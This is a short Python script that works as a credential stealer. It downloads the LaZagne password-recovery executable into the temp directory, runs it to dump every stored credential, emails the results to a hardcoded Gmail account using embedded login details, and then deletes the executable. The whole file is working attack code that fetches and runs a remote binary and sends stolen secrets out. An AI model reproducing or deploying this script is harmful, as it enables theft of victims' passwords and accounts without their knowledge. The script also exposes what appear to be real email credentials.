#!/usr/bin/env python

import requests
import subprocess
import smtplib
import os
import tempfile

# download
def download(url):     
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:      # write and binary file mode
        out_file.write(get_response.content)

# send email with message
def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()
    
# main
temp_directory = tempfile.gettempdir()      # get /tmp directory
os.chdir(temp_directory)                    # go to /tmp directory
download("http://link-holding-laZagne/laZagne.exe")
result = subprocess.check_output("laZagne.exe all", shell=True)
send_mail("davidlw0812@gmail.com", "QAZqwe123", result)
os.remove("laZagne.exe")
